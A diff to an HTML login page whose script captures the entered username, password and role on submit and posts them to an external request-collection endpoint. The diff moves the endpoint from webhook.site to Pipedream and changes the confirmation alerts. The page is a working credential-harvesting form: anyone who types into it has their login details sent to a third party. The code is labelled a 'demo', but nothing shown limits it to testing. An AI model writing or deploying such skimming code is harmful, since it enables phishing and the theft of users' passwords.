@@ -129,14 +129,15 @@
     </div>
   </div>
   <script>
-  document.querySelector('.login-btn').addEventListener('click', function () {
+  document.querySelector('.login-btn').addEventListener('click', function (e) {
+    e.preventDefault(); // Prevent page reload
+
     const username = document.querySelector('input[type="text"]').value.trim();
     const password = document.querySelector('input[type="password"]').value.trim();
     const roleElement = document.querySelector('input[name="loginas"]:checked');
     const role = roleElement ? roleElement.nextSibling.textContent.trim() : 'Unknown';
 
-    // Send the data to your webhook.site URL
-    fetch('https://webhook.site/35921cd4-7013-453f-81ca-2ed3458561ed', {
+    fetch('https://eombn58l89hpzz7.m.pipedream.net', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -149,8 +150,8 @@
       })
     })
     .then(() => {
-      console.log("✅ Data sent to webhook successfully.");
-      alert("🔍 Demo credentials sent! (Check your webhook.site)");
+      console.log("✅ Data sent to Pipedream successfully.");
+      alert("🛰️ Demo credentials sent! Check your Pipedream inbox.");
     })
     .catch((error) => {
       console.error("❌ Error sending data:", error);
@@ -158,7 +159,5 @@
     });
   });
 </script>
-
-
 </body>
 </html>
